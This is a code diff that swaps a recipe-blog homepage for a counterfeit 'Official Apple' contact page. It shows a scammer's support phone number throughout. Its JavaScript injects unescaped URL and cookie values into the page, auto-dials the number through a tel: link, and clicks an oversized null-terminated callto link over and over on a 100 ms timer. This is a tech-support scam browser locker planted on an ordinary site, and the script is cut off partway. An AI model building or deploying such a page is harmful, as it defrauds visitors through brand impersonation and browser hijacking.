@@ -1,19 +1,375 @@
-<html><head><meta charset="UTF-8" class="caption-clxydGOh"/><link rel="stylesheet" href="styles.css" class="page-MAYOmwQJqJyDxrk"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" class="avatar-WFVflSPSPAmFsHC"/><meta name="referrer" content="no-referrer" class="pic-dkgqpUoGx"/><style> @import url('https://fonts.googleapis.com/css2?family=Overpass:ital,wght@0,100..900;1,100..900&display=swap'); html,body{overflow-x: hidden;} *{margin:0;padding:0;} *::-webkit-scrollbar { background-color: #d0e0f6; border-radius: 47px; } *::-webkit-scrollbar-thumb { background-color: #6748ca; border-radius: 47px; border: 2px solid #d0e0f6; } a{text-decoration:none} p,li{text-indent: calc(30vw/var(--resizer)*100)} ol{padding-left: calc(30vw/var(--resizer)*100)} h2{text-align: center;} input{outline: none;} #close:checked ~ section {display: none !important;} input::placeholder {color: inherit;} :root { --resizer: 1440; } @media screen and (max-width:414px) { :root { --resizer: 350; } } </style><title>platria.xyz</title><!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-YTP08B4056"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
 
-  gtag('config', 'G-YTP08B4056');
-</script>
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js">
+
+
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta http-equiv="cache-control" content="max-age=3600" />
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more." />
+    <link rel="stylesheet" href="Base.css" type="text/css" />
+    <link rel="stylesheet" type="text/css" href="fonts/_families%3dSF%2bPro%2cv1_7CSF%2bPro%2bIcons%2cv1html.html" />
+    <script src="text_tel.js"></script>
 <!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-2DMKRPGVF0"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
 
-  gtag('config', 'G-0LY0HY7L01');
+  gtag('config', 'G-2DMKRPGVF0');
 </script>
-</head><body class="xl-sQjSXFMjtG"><main class="inner-oPeVkJodfsfoL"><div class="lg-DFMwRbVoGVLQDdz"><div class="control-AWsRGWTQnAxWMCW"><div class="wide-GElJnUbh"><h3 class="xl-MpaVVM">platria.xyz</h3><span class="thumb-XjGyTniOpry">Dish This article explores the Vegan Meal Taste rich diversity of Desserts global Cooking cuisines, highlighting traditional dishes, Flavor unique Seafood cooking methods, and Ingredient Soups the Vegetarian Beverages Snacks Cuisine cultural significance Recipe of Non-veg food Dining around the world.</span></div><div class="desc-pGSDZcMuKzerihW"><a href="themelist0.html" class="widget-HXPXlElZPzaeQFBd"><span class="userpic-QSDZIJ">Show all</span></a><a href="index.php" class="active-yFuNhvZaA"><span class="wide-sKhjAHP">Tell friends</span></a></div></div></div><div class="title-mvIKXsRbxCudrH"><div class="picture-OTWpLjpoFZ"><div class="all-BEkYFjzyYaauJYxQ"><h3 class="img-ZTzjDfxBuwXrJsGK">Photos gallery</h3></div></div><div class="lg-sEesXaPwN"><div class="img-ZdFyAvGcYMgqbDZL"><img src="./img/232484a2895af2276be51f1f898992da8b02e295.jpg" class="content-rRNHCPnesgD"/><img src="./img/76c1ec04cbccd128943c5b412bc0c579d48679e3.jpg" class="wrapper-maIuyKKuZelBVBe"/><img src="./img/957a8c9ad107b1118d5e276d5336449ba4b21d40.jpg" class="page-VyGWvRZyJv"/><img src="./img/cf4442bd8676aa3d5f0c95bd10ee859b4e957653.jpg" class="page-vXJZHBnNDBmR"/></div></div></div><div style="display: flex; position: relative; justify-content: center; align-items: center; min-width: 80%; gap: calc(48vw/var(--resizer)*100); padding: calc(50vw/var(--resizer)*100) 10% calc(50vw/var(--resizer)*100) 10%; flex-direction: column; background-color: #6748ca; background-image: url(&quot;data:image/svg+xml,%3Csvg%20id%3D'chinese-11_13529'%20width%3D'100%25'%20height%3D'1000px'%20xmlns%3D'http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg'%3E%3Cdefs%3E%3Cstyle%3E%0A%20%20%20%20%40keyframes%20float1%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(17px%2C%200)%20rotate(90deg)%20scale(1.8249745648269737)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float1%20%7B%0A%20%20%20%20%20%20animation%3A%20float1%203s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%20%20%40keyframes%20float2%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(-20px%2C%20-19px)%20rotate(136deg)%20scale(1.4494471214350042)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float2%20%7B%0A%20%20%20%20%20%20animation%3A%20float2%205s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%20%20%40keyframes%20float3%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%2015px)%20rotate(96deg)%20scale(0.6972945398676327)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float3%20%7B%0A%20%20%20%20%20%20animation%3A%20float3%205s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%3C%2Fstyle%3E%3Cpattern%20id%3D'82042'%20patternUnits%3D'userSpaceOnUse'%20width%3D'50'%20height%3D'50'%20patternTransform%3D'scale(7)%20rotate(153)'%3E%3Crect%20x%3D'0'%20y%3D'0'%20width%3D'100%25'%20height%3D'100%25'%20fill%3D'%2314305e'%2F%3E%3Cpath%20d%3D'M10.6%200c0%20.203-.019.4-.03.6h3.83v10.3h9.95v3.522c-5.345.325-9.632%204.627-9.932%209.978H10.75v-9.85H.55v-3.978c-.183.01-.364.028-.55.028v28.8c.186%200%20.367.018.55.028V35.75h10.2V25.6h3.668c.3%205.351%204.588%209.653%209.932%209.978V39.4H14.4v10.05h-3.828c.01.183.028.364.028.55h28.8c0-.186.018-.367.028-.55H35.6V39.4H25.55v-3.814c5.391-.277%209.73-4.601%2010.032-9.986h3.668v10.15h10.2v3.678c.183-.01.364-.028.55-.028V10.6c-.186%200-.367-.018-.55-.028v3.978h-10.2v9.85h-3.668c-.302-5.385-4.64-9.71-10.032-9.986V10.9H35.6V.6h3.83C39.42.4%2039.4.203%2039.4%200Zm5%20.6h8.75v9.1H15.6zm9.95%200h8.85v9.1h-8.85Zm-.55%2015a9.4%209.4%200%200%201%20.55.018c4.73.273%208.53%204.06%208.829%208.782a9.4%209.4%200%200%201%20.02.574L34.4%2025v.007a9.4%209.4%200%200%201-.042.593h.02c-.298%204.723-4.099%208.509-8.828%208.783v-.037a9.4%209.4%200%200%201-.546.054h-.008a9.4%209.4%200%200%201-.646-.064v.04c-4.682-.323-8.432-4.087-8.729-8.776h.022a9.4%209.4%200%200%201-.043-.6%209.4%209.4%200%200%201%20.043-.6h-.022c.297-4.689%204.047-8.453%208.73-8.775v.039A9.4%209.4%200%200%201%2025%2015.6zm-24.45.15h9v8.65h-9Zm39.9%200h9v8.65h-9ZM.55%2025.6h9v8.95h-9Zm39.9%200h9v8.95h-9Zm-24.85%2015h8.75v8.85H15.6zm9.95%200h8.85v8.85h-8.85ZM9.4%200c0%205.183-4.217%209.4-9.4%209.4v1.2c5.845%200%2010.6-4.755%2010.6-10.6Zm30%200a10.5%2010.5%200%200%200%20.122%201.612%2010.514%2010.514%200%200%200%201.69%204.31%2010.658%2010.658%200%200%200%202.45%202.57%2010.657%2010.657%200%200%200%202.697%201.464A10.512%2010.512%200%200%200%2050%2010.6V9.4a9.555%209.555%200%200%201-1.892-.191%209.321%209.321%200%200%201-3.729-1.679%209.468%209.468%200%200%201-3.04-3.875A9.338%209.338%200%200%201%2040.6%200zM50%2039.4c-5.845%200-10.6%204.755-10.6%2010.6h1.2c0-5.183%204.217-9.4%209.4-9.4zm-50%200v1.2c5.183%200%209.4%204.217%209.4%209.4h1.2c0-5.845-4.755-10.6-10.6-10.6Z'%20class%3D'float3'%20style%3D'opacity%3A%20.15'%20%20stroke-width%3D'1'%20stroke%3D'none'%20fill%3D'%236748ca'%2F%3E%3C%2Fpattern%3E%3C%2Fdefs%3E%3Crect%20width%3D'800%25'%20height%3D'800%25'%20transform%3D'translate(-156%2C-82)'%20fill%3D'url(%2382042)'%2F%3E%3C%2Fsvg%3E&quot;);" class="image-ASFmJBWiVxgEDox"><div class="box-gTAtoBtP"><div class="inner-eVUnjajYkLsHncy"><div class="holder-DOqUptigb"><div class="section-nJaPQbjIPkWhUrhd"><img src="./img/fd97ddcbeceef43f51f7f36926847c4e541d701c.jpg" class="grid-sztgaCHPZWfMtP"/></div></div><div class="more-WQuito"><div class="thumb-nfQnnDeHCluEWcWP"><h5 class="large-ZzNOkTLrYJ">Exploring the Art of Cheese Making: A Journey from Milk to Deliciousness</h5><div class="section-qcTmsiZqsClz"><span class="btn-uqTqUNA">Cooking This Recipe article Dining takes you through Soups Meal Cuisine Vegan the fascinating Taste Flavor Seafood Dish process of cheese making, Beverages covering Snacks the various types of cheese, essential techniques, and Non-veg tips Vegetarian Ingredient for Desserts beginners.</span></div></div><div class="userpic-CKeepsLGaS"><a href="themelist1.html" class="box-fVmWsa"><span class="picture-xWSqNH">Full text</span></a></div><div class="button-ayOJTWbq"><div class="all-VzpIEfwZiTnnRBj"><div class="inner-patncrYb"><span class="page-ydMRDhHRLcHfHAN">Oliver Thompson</span></div></div><div class="md-qTMEhLtvPVOBOLMe"><div class="icon-aTaUlTQtWQeKhi"><span class="thumbnail-PJwtCqbasThcYFX">2024-12-02</span></div></div></div></div></div><div class="caption-mVgVbwjeglM"><div class="tip-niXuirlu"><div class="title-XxeTsgar"><img src="./img/4934d503a496d7e74078b18d6dea719e06518bc2.jpg" class="wide-ReXdcqkJbqyN"/></div></div><div class="text-tizKcxaNJqlztQhr"><div class="large-veBaKpufazIidFHZ"><h5 class="content-XhPuukZVqx">Exploring the Nutritional Benefits and Culinary Versatility of Berries</h5><div class="tagline-SVdvJhq"><span class="sm-dxbCUShzfVzPCO">An in-depth Ingredient look at the various Non-veg Vegan Flavor Cuisine types Taste of Dish Desserts berries, their Dining Recipe nutritional value, Beverages Meal Cooking and their applications in cooking Soups and Snacks Vegetarian baking. Seafood</span></div></div><div class="medium-OtdKwba"><a href="themelist2.html" class="content-YcaSwvaQweVLdSB"><span class="huge-xMBYCTyJpRV">Full text</span></a></div><div class="inner-KzOJHddXmKSgxjVi"><div class="wrap-UbwkTyiMDz"><div class="sidebar-JSZjUEfwMJbykLu"><span class="pic-MMiDSJezy">Lucas Martinez</span></div></div><div class="more-XJoInidkHBlkOyeq"><div class="large-fmPpeiAK"><span class="wrap-BibatVi">2025-07-09</span></div></div></div></div></div><div class="desc-aiVFbCSwprA"><div class="aside-Gokivetl"><div class="preview-qzDvFpVNfkK"><img src="./img/562f5e18bc8a89762c3962916ad9e278f64678c8.jpg" class="box-qmOrqskNQU"/></div></div><div class="md-ApoJLgZCBGvDGDGV"><div class="huge-LdXXHkdYDjThW"><h5 class="big-XHffDjS">Culinary Innovation: The Rise of the Plant-Based Movement</h5><div class="breadcrumbs-nGDHlyPj"><span class="title-DJAFIcijcSLFTJv">Desserts This Non-veg article Soups explores the growing popularity Cuisine of Cooking plant-based diets, Recipe Ingredient Dish Meal examining Snacks how restaurants are adapting Flavor their menus and Vegan the cultural shifts Beverages driving Taste Seafood this Vegetarian trend. Dining</span></div></div><div class="img-HraQfZuXCjQuFge"><a href="themelist3.html" class="image-SSzkeqKrLv"><span class="button-aGsIpKoqa">Full text</span></a></div><div class="small-xRVTSPydFgklcH"><div class="preview-TcKqCkvjYAoZcOQ"><div class="box-sdmFZPkavhnjoJe"><span class="all-WmmZZQDHt">Lucas Hernandez</span></div></div><div class="wrap-aTBlJDvNDmnK"><div class="thumb-pPRUPCanmIqL"><span class="active-fsetpTZo">2025-08-05</span></div></div></div></div></div><div class="avatar-TWWrPHfiHLc"><div class="all-TvaNbGOhyF"><div class="img-ttWiqWacRtcaxpzM"><img src="./img/4ef3f451dfda503f6142a6dc66dcbba2fe6272e4.jpg" class="desc-xlxCjjnrP"/></div></div><div class="picture-JNvlGtTAcPD"><div class="thumbnail-bAVPWWj"><h5 class="subtitle-uZMYaOXAqwDOxR">Savoring Tradition: A Journey Through World Cuisines</h5><div class="sm-FYHPxMoauujhu"><span class="wrap-TeZffohmnoQR">Cuisine This Desserts Vegan article Seafood Flavor explores the rich Meal Beverages Dish Ingredient traditions Vegetarian of Soups world Cooking cuisines, highlighting iconic dishes, Snacks their Non-veg cultural significance, and the joy Recipe Taste they bring Dining to communities.</span></div></div><div class="md-zcTatWmuYTss"><a href="themelist4.html" class="medium-ejpqseDbqaot"><span class="huge-enksmKItqWteRD">Full text</span></a></div><div class="subject-LSldaQLGYMnvpCw"><div class="tagline-rFBVXgLnz"><div class="row-IIdnqCEcqzyfI"><span class="content-ukykhwstIOHk">Sophia Martinez</span></div></div><div class="huge-VgHAwG"><div class="container-yhMIJxxdyyxIdZTK"><span class="lg-wrILbUPWriCcfG">2024-09-05</span></div></div></div></div></div><div class="heading-ZhHYge"><div class="desc-XjnOKGgKeFUqBhe"><div class="desc-DsZzsHAdMViMsDbz"><img src="./img/9a90f5e37c194e5fa43f9f144617eda4da47f4c9.jpg" class="xs-BrIQIqZCVtax"/></div></div><div class="container-BnXXFN"><div class="img-ArNIlBvyUjRLR"><h5 class="row-PWueywDlSAnPwtX">Exploring the New World of Functional Beverages: A Dive into Juice Innovations</h5><div class="avatar-pVVBhLcaJZ"><span class="grid-pgBTuaTEQaunj">This article delves into the growing popularity of functional Ingredient Vegan Flavor beverages Dish in Cuisine the juice Meal Desserts market. From health-boosting Snacks ingredients Beverages to unique processing methods, it explores the innovative trends driving Soups Cooking the evolution Taste of juices. Non-veg The article highlights how Vegetarian functional juices Recipe are meeting the needs of modern Seafood consumers and reshaping the Dining beverage landscape.</span></div></div><div class="xs-DkSWWSsIOYynYLQ"><a href="themelist5.html" class="container-iDzpjSVxC"><span class="button-DuVIptZEimcxfdE">Full text</span></a></div><div class="wrapper-AndhEDQyJnqDrX"><div class="caption-QRCJNvgzY"><div class="container-MtPpIcHcDRlqdqH"><span class="widget-YptpvhLaEbtfrb">Daniela Rodriguez</span></div></div><div class="box-RrAXaWBci"><div class="headline-EztoOZCKaZahCUPK"><span class="btn-VEYBkfXqRqG">2025-02-13</span></div></div></div></div></div></div></div></main><footer class="current-duoyApowSiPQpd"><div class="large-jLTcZDkGdVTY"><a href="./privacy_policy.html" class="preview-SJxbQaWKN">Privacy Policy</a><a href="./terms_of_use.html" class="heading-fImuNXdbG">Terms Of Use</a><a href="./cookie_policy.html" class="small-eWLMohGWjfHeM">Cookies Policy</a></div></footer><input type="checkbox" id="close" class="small-lbJRDFrGVf"/><section class="caption-wxdzeXjijosYtvP"><div class="narrow-jynUxaLrLk"><span class="xl-UXsurir">This website uses cookies to ensure you get the best experience on our website. By using our site you consent cookies. Learn more.</span></div><div class="col-AOBEFYAhA"><div class="xl-TzgeNDfBli"><label for="close" class="icon-lBJtTR"><span class="holder-qcTnXhLj">More about</span></label></div><div class="thumb-qzgLeXybjbvUYlN"><label for="close" class="content-HsEEBcYxpsjSrXJ"><span class="sidebar-CknVlebInT">Reject</span></label></div><div class="avatar-TLidyXJDVZjjgiI"><label for="close" class="inner-XKPVCwQyBXKvo"><span class="headline-QFlRCxJqqDO">Approve</span></label></div></div></section></body></html>
+
+</head>
+
+<body>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate" />
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false" />
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav" />
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
+
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-844-659-3342 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close"
+                            id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class='as-banner-cont'>
+                        <div class='as-banner-image as-banner-image--top'>
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("globalnav/apple/contact-us-hero.image.large_2x.jpg");
+                                }
+
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
+
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("globalnav/apple/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="globalnav/apple/contact-us-hero.image.small_2x.jpg 735w, globalnav/apple/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="globalnav/apple/contact-us-hero.image.large_2x.jpg"
+                            />
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock" />
+                        </div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">APPLE STORE </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="globalnav/apple/us.png" alt="" width="16" height="16" />United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2025 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name" />
+                <meta content="+1-844-659-3342
+			 " property="telephone" />
+            </section>
+        </div>
+    </footer>
+
+
+
+    <script src="code.jquery.com/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
+
+
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-844-659-3342');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
+                window.device = 'iPhone';
+            }
+
+            if (/ipad/.test(userAgent)) {
+                window.device = 'iPad';
+            }
+
+            if (/ipod/.test(userAgent)) {
+                window.device = 'iPod';
+            }
+        }
+
+        var text = cookieHelper.get('textSetBl');
+        var phone = cookieHelper.get('phoneSetBl');
+
+        function getText() {
+            var str = window.defaultText;
+
+            for (var d in window.text) {
+                if (window.refef.indexOf(d) != -1) {
+                    str = window.text[d];
+                }
+            }
+            //var str = window.text[window.refef]?window.text[window.refef]:window.defaultText;
+            return str.replace('|%model%|', window.device).replace('|%ref%|', window.refef);
+        }
+
+
+        if (!phone) {
+            phone = getURLParameter('phone');
+        }
+        if (!text) {
+            text = getURLParameter('text');
+        }
+
+        var sText = document.querySelectorAll('.js_setTextBlock');
+        for (var t = 0; t < sText.length; t++) {
+            sText[t].innerHTML = getText();
+        }
+        var sPhone = document.querySelectorAll('.js_setPhoneBlock');
+        for (var p = 0; p < sPhone.length; p++) {
+            sPhone[p].innerHTML = phone;
+        }
+
+
+        setInterval(function() {
+            myFunction()
+        }, 100);
+
+        function okkkk() {
+            jQuery('#result').append('<a  class="anchorcall" href="tel:+1-844-659-3342"></a>');
+            document.querySelector('a').click();
+            var extraData = "";
+            for (itxextraData = 0; itxextraData < 200; itxextraData++) {
+                var extraData = extraData + "5555555555";
+            }
+            jQuery('#result').append('<a href="#callto+' + extraData + '%00"></a>');
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
+            document.querySelector('a').click();
